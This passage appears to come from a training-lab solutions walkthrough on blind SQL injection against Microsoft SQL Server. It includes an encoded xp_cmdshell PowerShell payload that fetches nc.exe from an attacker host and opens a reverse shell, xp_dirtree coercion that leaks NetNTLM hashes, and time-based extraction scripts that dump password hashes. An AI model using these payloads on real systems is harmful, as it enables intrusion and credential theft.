└──╼ [★]$ printf %s "'EXEC xp_cmdshell 'powershell.exe -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4ANwA1ADoAOQAwADAAMQAvAG4AYwAuAGUAeABlACIALAAgACIAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACIAKQA7ACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgA3ADUAIAA5ADAAMAAyACAALQBlACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAOwA='--" | jq -rR @uri

'EXEC%20xp_cmdshell%20'powershell.exe%20-exec%20bypass%20-enc%20KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4ANwA1ADoAOQAwADAAMQAvAG4AYwAuAGUAeABlACIALAAgACIAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACIAKQA7ACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgA3ADUAIAA5ADAAMAAyACAALQBlACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAOwA%3D'--
```

Afterward, students need to download a compiled version of `nc` for Microsoft Windows from [GitHub](https://github.com/int0x33/nc.exe/raw/master/nc.exe):

Code: shell

```shell
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe

--2022-12-26 14:28:13--  https://github.com/int0x33/nc.exe/raw/master/nc.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/int0x33/nc.exe/master/nc.exe [following]
--2022-12-26 14:28:13--  https://raw.githubusercontent.com/int0x33/nc.exe/master/nc.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38616 (38K) [application/octet-stream]
Saving to: ‘nc.exe’

nc.exe                                  100%[=============================================================================>]  37.71K  --.-KB/s    in 0.001s  

2022-12-26 14:28:13 (34.9 MB/s) - ‘nc.exe’ saved [38616/38616]
```

Then, students need to start a web server with Python using the port specified for the web server in the `PowerShell` payload (9001 in here):

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ python3 -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Subsequently, students need to start an `nc` listener to catch the reverse shell connection using the same port specified for it in the `PowerShell` payload (9002 here):

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ nc -nvlp 9002

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
```

Students then need to send the URL-encoded payload with `cURL`, abusing the blind SQLi vulnerability previously discovered in Aunt Maria's Donuts web application:

Code: shell

```shell
curl -w "\n" -s "http://STMIP/api/check-username.php?u='EXEC%20xp_cmdshell%20'powershell.exe%20-exec%20bypass%20-enc%20KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4ANwA1ADoAOQAwADAAMQAvAG4AYwAuAGUAeABlACIALAAgACIAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACIAKQA7ACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgA3ADUAIAA5ADAAMAAyACAALQBlACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAOwA%3D'--"
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ curl -w "\n" -s "http://10.129.208.121/api/check-username.php?u='EXEC%20xp_cmdshell%20'powershell.exe%20-exec%20bypass%20-enc%20KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4ANwA1ADoAOQAwADAAMQAvAG4AYwAuAGUAeABlACIALAAgACIAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACIAKQA7ACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgA3ADUAIAA5ADAAMAAyACAALQBlACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAOwA%3D'--"
```

When checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
Ncat: Connection from 10.129.208.121.
Ncat: Connection from 10.129.208.121:53316.
Microsoft Windows [Version 10.0.20348.1366]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

At last, students need to run `systeminfo`, to find that the value of `OS Version` is `10.0.20348 N/A Build 20348`:

Code: cmd

```cmd
systeminfo | FindStr /c:"OS Version"
```

```
C:\Windows\system32>systeminfo | FindStr /c:"OS Version"

systeminfo | FindStr /c:"OS Version"
OS Version:                10.0.20348 N/A Build 20348
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
```

Answer: `10.0.20348 N/A Build 20348`

# Leaking NetNTLM Hashes

## Question 1

### "Capture jason's NetNTLM hash and crack it. What is his password?"

After spawning the target machine, students first need to start `Responder` on the interface `tun0`:

Code: shell

```shell
sudo responder -I tun0
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-tp9xa5laqu]─[~]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
<SNIP>
```

Then, students need to coerce the SQL server into trying to access the SMB share `myshare` started by `Responder`, to capture its NetNTLM credentials:

Code: sql

```sql
'EXEC master..xp_dirtree '\\\\PWNIP\\myshare', 1, 1;--
```

Students need to URL-encode the payload:

Code: shell

```shell
printf %s "';EXEC master..xp_dirtree '\\\\PWNIP\myshare', 1, 1;--" | jq -rR @uri
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-focpfc9ov5]─[~]
└──╼ [★]$ printf %s "';EXEC master..xp_dirtree '\\\\10.10.15.75\myshare', 1, 1;--" | jq -rR @uri

'%3BEXEC%20master..xp_dirtree%20'%5C%5C10.10.15.75%5Cmyshare'%2C%201%2C%201%3B--
```

Afterward, students need to send the URL-encoded payload with `cURL`, abusing the blind SQLi vulnerability previously discovered in Aunt's Maria's Donuts web application:

Code: shell

```shell
curl -w "\n" -s "http://STMIP/api/check-username.php?u='%3BEXEC%20master..xp_dirtree%20'%5C%5C10.10.15.75%5Cmyshare'%2C%201%2C%201%3B--"
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-focpfc9ov5]─[~]
└──╼ [★]$ curl -w "\n" -s "http://10.129.225.203/api/check-username.php?u='%3BEXEC%20master..xp_dirtree%20'%5C%5C10.10.15.75%5Cmyshare'%2C%201%2C%201%3B--"

{"status":"available"}
```

When checking `Responder`, students will find the hash `jason::SQL01:4d45bf342be5030e:627ACDB27C364B261F810CA6DE795CA8:010100000000000080A421F24119D90132262EA94FC3233A000000000200080056004F003100510001001E00570049004E002D0054004F004D0049005800490049004B0055003900570004003400570049004E002D0054004F004D0049005800490049004B005500390057002E0056004F00310051002E004C004F00430041004C000300140056004F00310051002E004C004F00430041004C000500140056004F00310051002E004C004F00430041004C000700080080A421F24119D90106000400020000000800300030000000000000000000000000300000A86FDF5723B484E43125C24419CA754918B64125325DDF0F44C34AA5FA13287D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00370035000000000000000000`:

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.225.203
[SMB] NTLMv2-SSP Username : SQL01\jason
[SMB] NTLMv2-SSP Hash     : jason::SQL01:4d45bf342be5030e:627ACDB27C364B261F810CA6DE795CA8:010100000000000080A421F24119D90132262EA94FC3233A000000000200080056004F003100510001001E00570049004E002D0054004F004D0049005800490049004B0055003900570004003400570049004E002D0054004F004D0049005800490049004B005500390057002E0056004F00310051002E004C004F00430041004C000300140056004F00310051002E004C004F00430041004C000500140056004F00310051002E004C004F00430041004C000700080080A421F24119D90106000400020000000800300030000000000000000000000000300000A86FDF5723B484E43125C24419CA754918B64125325DDF0F44C34AA5FA13287D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00370035000000000000000000
```

At last, students need to crack the NetNTLM hash with `Hashcat`, utilizing hashmode 5600, to attain the cleartext `Meduniwien`:

Code: shell

```shell
hashcat -m 5600 -O -w 3 'jason::SQL01:4d45bf342be5030e:627ACDB27C364B261F810CA6DE795CA8:010100000000000080A421F24119D90132262EA94FC3233A000000000200080056004F003100510001001E00570049004E002D0054004F004D0049005800490049004B0055003900570004003400570049004E002D0054004F004D0049005800490049004B005500390057002E0056004F00310051002E004C004F00430041004C000300140056004F00310051002E004C004F00430041004C000500140056004F00310051002E004C004F00430041004C000700080080A421F24119D90106000400020000000800300030000000000000000000000000300000A86FDF5723B484E43125C24419CA754918B64125325DDF0F44C34AA5FA13287D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00370035000000000000000000' /usr/share/wordlists/rockyou.txt
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-focpfc9ov5]─[~]
└──╼ [★]$ hashcat -m 5600 -O -w 3 'jason::SQL01:4d45bf342be5030e:627ACDB27C364B261F810CA6DE795CA8:010100000000000080A421F24119D90132262EA94FC3233A000000000200080056004F003100510001001E00570049004E002D0054004F004D0049005800490049004B0055003900570004003400570049004E002D0054004F004D0049005800490049004B005500390057002E0056004F00310051002E004C004F00430041004C000300140056004F00310051002E004C004F00430041004C000500140056004F00310051002E004C004F00430041004C000700080080A421F24119D90106000400020000000800300030000000000000000000000000300000A86FDF5723B484E43125C24419CA754918B64125325DDF0F44C34AA5FA13287D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00370035000000000000000000' /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-DO-Regular, 5843/5907 MB (2048 MB allocatable), 4MCU

<SNIP>

JASON::SQL01:4d45bf342be5030e:627acdb27c364b261f810ca6de795ca8:010100000000000080a421f24119d90132262ea94fc3233a000000000200080056004f003100510001001e00570049004e002d0054004f004d0049005800490049004b0055003900570004003400570049004e002d0054004f004d0049005800490049004b005500390057002e0056004f00310051002e004c004f00430041004c000300140056004f00310051002e004c004f00430041004c000500140056004f00310051002e004c004f00430041004c000700080080a421f24119d90106000400020000000800300030000000000000000000000000300000a86fdf5723b484e43125c24419ca754918b64125325ddf0f44c34aa5fa13287d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00370035000000000000000000:Meduniwien

<SNIP>
```

Answer: `Meduniwien`

# File Read

## Question 1

### "Use the knowledge from this section to read the contents of 'C:\\Windows\\System32\\flag.txt'. What is it?"

After spawning the target machine, students first need to check if they have the permissions `ADMINISTER BULK OPERATIONS` or `ADMINISTER DATABASE BULK OPERATIONS`:

Code: sql

```sql
maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS') > 0;--
```

Students need to URL-encode the payload:

Code: shell

```shell
printf %s "maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS') > 0;--" | jq -rR @uri
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-focpfc9ov5]─[~]
└──╼ [★]$ printf %s "maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS') > 0;--" | jq -rR @uri

maria'%20AND%20(SELECT%20COUNT(*)%20FROM%20fn_my_permissions(NULL%2C%20'DATABASE')%20WHERE%20permission_name%20%3D%20'ADMINISTER%20BULK%20OPERATIONS'%20OR%20permission_name%20%3D%20'ADMINISTER%20DATABASE%20BULK%20OPERATIONS')%20%3E%200%3B--
```

Students then need to send the payload with `cURL`, noticing that the response received is `taken`, which indicates that the query evaluated to `true`, therefore, the permissions `ADMINISTER BULK OPERATIONS` or `ADMINISTER DATABASE BULK OPERATIONS` are granted to the user running the queries in the backend:

Code: shell

```shell
curl -w "\n" -s "http://STMIP/api/check-username.php?u=maria'%20AND%20(SELECT%20COUNT(*)%20FROM%20fn_my_permissions(NULL%2C%20'DATABASE')%20WHERE%20permission_name%20%3D%20'ADMINISTER%20BULK%20OPERATIONS'%20OR%20permission_name%20%3D%20'ADMINISTER%20DATABASE%20BULK%20OPERATIONS')%20%3E%200%3B--"
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-focpfc9ov5]─[~]
└──╼ [★]$ curl -w "\n" -s "http://10.129.225.203/api/check-username.php?u=maria'%20AND%20(SELECT%20COUNT(*)%20FROM%20fn_my_permissions(NULL%2C%20'DATABASE')%20WHERE%20permission_name%20%3D%20'ADMINISTER%20BULK%20OPERATIONS'%20OR%20permission_name%20%3D%20'ADMINISTER%20DATABASE%20BULK%20OPERATIONS')%20%3E%200%3B--"

{"status":"taken"}
```

Afterward, students need to modify the script provided in the module's section to read the contents of the file `C:\Windows\System32\flag.txt`:

Code: python

```python
#!/usr/bin/python3

import requests, json, sys
from urllib.parse import quote_plus

target = "maria"

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -");
    response = requests.get(f"http://STMIP/api/check-username.php?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

filePath = r'C:\Windows\System32\flag.txt'

length = 1
while not oracle(f"(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{filePath}', SINGLE_CLOB) AS x) = {length}"):
    length += 1
print("File = ", end = '')
for i in range(1, length +1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"(SELECT ASCII(SUBSTRING(BulkColumn, {i}, 1)) FROM OPENROWSET(BULK '{filePath}', SINGLE_CLOB) AS X) BETWEEN {low} and {mid}"):
            high = mid - 1
        else:
            low = mid + 1
    print(chr(low), end = '')
    sys.stdout.flush()
print()
```

After running the script, students will attain the flag `HTB{049df28ef2c92ee1614568e0fd5c9e4d}`:

Code: shell

```shell
python3 oracle.py
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-focpfc9ov5]─[~]
└──╼ [★]$ python3 oracle.py

File = HTB{049df28ef2c92ee1614568e0fd5c9e4d}
```

Answer: `HTB{049df28ef2c92ee1614568e0fd5c9e4d}`

# Skills Assessment

## Question 1

### "Exploit a blind SQL injection vulnerability to dump the administrator's password hash."

After spawning the target machine, students need to start testing for SQL injection vulnerabilities within the website. When intercepting the request sent to the web root page (i.e., `index.php`), students will notice that there is a cookie called `TrackingId`, and most probably, the backend is saving its value in the database to keep track of the users:

![[HTB Solutions/CWEE/z. images/8ebf037b6836c0a042daf4aa7b7cd24e_MD5.jpg]]

After fuzzing this endpoint (either manually or with `SQLMap`), students will discover that it is vulnerable to a time-based blind SQL injection; students can make the response delay for 10 seconds using the `WAITFOR DELAY` statement:

Code: sql

```sql
';IF(1=1) WAITFOR DELAY '0:0:10';--
```

Students need to URL-encode the payload:

Code: shell

```shell
printf %s "';IF(1=1) WAITFOR DELAY '0:0:10';--" | jq -Rr @uri
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-ve3mpgjrh9]─[~]
└──╼ [★]$ printf %s "';IF(1=1) WAITFOR DELAY '0:0:10';--" | jq -Rr @uri

'%3BIF(1%3D1)%20WAITFOR%20DELAY%20'0%3A0%3A10'%3B--
```

With the attained payload, students will notice after sending it that the response delays for 10 seconds before being received:

![[HTB Solutions/CWEE/z. images/8ee293fe96ebd4b83020940784f040e4_MD5.jpg]]

Now that the vulnerability has been identified, students need to build the oracle and start enumerating the database's table and column names (using the same techniques taught in the section `Data Extraction`). First, students need to dump the name of the database:

Code: python

```python
databaseNameLength = dumpNumber("LEN(DB_NAME())")
databaseName = dumpString("DB_NAME()", databaseNameLength)
```

Code: python

```python
import requests, time, sys
from urllib.parse import quote

DELAY = 3

def oracle(q):
    start = time.time()
    payload = quote(f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}';--")
    r = requests.get(
        "http://STMIP/index.php",
        cookies = {"TrackingId": payload}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

databaseNameLength = dumpNumber("LEN(DB_NAME())")
databaseName = dumpString("DB_NAME()", databaseNameLength)

print(databaseName)
```

After running the script, students will know that the database name is `d4y`:

Code: shell

```shell
python3 oracle.py
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-a4jup56ljx]─[~]
└──╼ [★]$ python3 oracle.py

d4y
```

Then, students need to enumerate the tables within the `d4y` database, but first, they need to know how many exist within it:

Code: python

```python
databaseName = "d4y"
numberOfTables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{databaseName}';")
```

Code: python

```python
import requests, time, sys
from urllib.parse import quote

DELAY = 3

def oracle(q):
    start = time.time()
    payload = quote(f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}';--")
    r = requests.get(
        "http://STMIP/index.php",
        cookies = {"TrackingId": payload}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

#databaseNameLength = dumpNumber("LEN(DB_NAME())") #3
#databaseName = dumpString("DB_NAME()", databaseNameLength) # d4y

databaseName = "d4y"
numberOfTables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{databaseName}';")

print(numberOfTables)
```

After running the script, students will know that there are 15 tables:

Code: shell

```shell
python3 oracle.py
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-a4jup56ljx]─[~]
└──╼ [★]$ python3 oracle.py

15
```

Thereafter, students need to dump the length of all 15 tables along with their names:

Code: python

```python
databaseName = "d4y"
numberOfTables = 15

for i in range(numberOfTables):
    tableNameLength = dumpNumber(f"SELECT LEN(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    print(tableNameLength)
    tableName = dumpString(f"SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", tableNameLength)
    print(tableName)
```

Code: python

```python
import requests, time, sys
from urllib.parse import quote

DELAY = 3

def oracle(q):
    start = time.time()
    payload = quote(f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}';--")
    r = requests.get(
        "http://STMIP/index.php",
        cookies = {"TrackingId": payload}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

#databaseNameLength = dumpNumber("LEN(DB_NAME())") #3
#databaseName = dumpString("DB_NAME()", databaseNameLength) # d4y

databaseName = "d4y"

#numberOfTables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{databaseName}';")
numberOfTables = 15

for i in range(numberOfTables):
    tableNameLength = dumpNumber(f"SELECT LEN(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    print(tableNameLength)
    tableName = dumpString(f"SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", tableNameLength)
    print(tableName)
```

After running the script, students will attain three table names, most importantly, the "users" table (the other tables, although failed to be dumped, do not matter in this case, as they might be using non-ASCII characters):

Code: shell

```shell
python3 oracle.py
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-a4jup56ljx]─[~]
└──╼ [★]$ python3 oracle.py

7
captcha
8
tracking
5
users
0

<SNIP>
```

Since the only interesting table is "users", students need to dump its column's names:

Code: python

```python
databaseName = "d4y"
numberOfTables = 15
tableName = "users"

numberOfColumns = dumpNumber(f"SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_Name='users' AND table_catalog='{databaseName}'")
print(numberOfColumns)

for i in range(numberOfColumns):
    columnNameLength = dumpNumber(f"SELECT LEN(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tableName}' AND TABLE_CATALOG='{databaseName}' ORDER BY COLUMN_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    print(columnNameLength)
    columnName = dumpString(f"SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tableName}' AND TABLE_CATALOG='{databaseName}' ORDER BY COLUMN_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", columnNameLength)
    print(columnName)
```

Code: python

```python
import requests, time, sys
from urllib.parse import quote

DELAY = 3

def oracle(q):
    start = time.time()
    payload = quote(f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}';--")
    r = requests.get(
        "http://STMIP/index.php",
        cookies = {"TrackingId": payload}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

#databaseNameLength = dumpNumber("LEN(DB_NAME())") #3
#databaseName = dumpString("DB_NAME()", databaseNameLength) # d4y

databaseName = "d4y"

#numberOfTables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{databaseName}';")
numberOfTables = 15

#for i in range(numberOfTables):
#    tableNameLength = dumpNumber(f"SELECT LEN(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
#    print(tableNameLength)
#    tableName = dumpString(f"SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", tableNameLength)
#    print(tableName)

tableName = "users"

numberOfColumns = dumpNumber(f"SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_Name='users' AND table_catalog='{databaseName}'")
print(numberOfColumns)

for i in range(numberOfColumns):
    columnNameLength = dumpNumber(f"SELECT LEN(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tableName}' AND TABLE_CATALOG='{databaseName}' ORDER BY COLUMN_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    print(columnNameLength)
    columnName = dumpString(f"SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tableName}' AND TABLE_CATALOG='{databaseName}' ORDER BY COLUMN_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", columnNameLength)
    print(columnName)
```

After running the script, students will know that there are three columns, which are "email", "password", and "role":

Code: shell

```shell
python3 oracle.py
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-myfhpevdfp]─[~]
└──╼ [★]$ python3 oracle.py 

3
5
email
8
password
4
role
```

Thereafter, students need to dump the number of rows in the "users" tables:

Code: python

```python
numberOfRows = dumpNumber("SELECT COUNT(*) FROM USERS")
```

Code: python

```python
import requests, time, sys
from urllib.parse import quote

DELAY = 3

def oracle(q):
    start = time.time()
    payload = quote(f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}';--")
    r = requests.get(
        "http://STMIP/index.php",
        cookies = {"TrackingId": payload}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

#databaseNameLength = dumpNumber("LEN(DB_NAME())") #3
#databaseName = dumpString("DB_NAME()", databaseNameLength) # d4y

databaseName = "d4y"

#numberOfTables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{databaseName}';")
numberOfTables = 15

#for i in range(numberOfTables):
#    tableNameLength = dumpNumber(f"SELECT LEN(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
#    print(tableNameLength)
#    tableName = dumpString(f"SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", tableNameLength)
#    print(tableName)

tableName = "users"

numberOfRows = dumpNumber("SELECT COUNT(*) FROM users")
print(numberOfRows)
```

After running the script, students will know that there is only one row:

Code: shell

```shell
python3 oracle.py
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-myfhpevdfp]─[~]
└──╼ [★]$ python3 oracle.py 

1
```

At last, since there is only one row, the password hash contained within it must be for the admin, therefore, students need to dump it:

Code: python

```python
numberOfRows = 1

row1Length = dumpNumber("SELECT TOP 1 LEN(password) FROM users")
print(dumpString("SELECT TOP 1 password FROM users", row1Length))
```

Code: python

```python
import requests, time, sys
